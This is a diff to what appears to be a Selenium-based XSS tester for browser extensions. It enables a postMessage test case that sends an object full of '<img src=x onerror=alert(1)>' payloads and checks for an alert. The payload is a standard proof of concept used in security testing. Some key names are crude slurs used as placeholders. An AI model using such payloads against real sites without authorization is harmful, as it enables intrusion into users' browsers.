@@ -70,7 +70,7 @@ def initialize(path_to_extension):
     # locationSearch(driver, abs_path, url_path, payloads)
 
     # case 7:
-    # windowAddEventListenerMessage(driver, abs_path, url_path, payloads)
+    windowAddEventListenerMessage(driver, abs_path, url_path, payloads)
 
 ################
 # Case Scenario#
@@ -952,10 +952,23 @@ def windowAddEventListenerMessage(driver, abs_path, url_path, payloads):
     for button in buttons:
         button.click()
 
+    regex_results = ['data', 'log', 'cocksuker123', '123skd', 'message']
+    xss_payload = '<img src=x onerror=alert(1)>'
+
 
     driver.switch_to.window(example)
-    driver.execute_script('postMessage({ message: "1", cock: "2", dickless_dude: "3" }, "*")')
+    object_payload = {key: xss_payload for key in regex_results}
 
+    driver.execute_script(f"window.postMessage({object_payload},'*')")
+    
+    try:
+        # wait 2 seconds to see if alert is detected
+        WebDriverWait(driver, 2).until(EC.alert_is_present())
+        alert = driver.switch_to.alert
+        alert.accept()
+        print('+ Alert Detected +')
+    except TimeoutException:
+        print('= No alerts detected =')
 
 
 
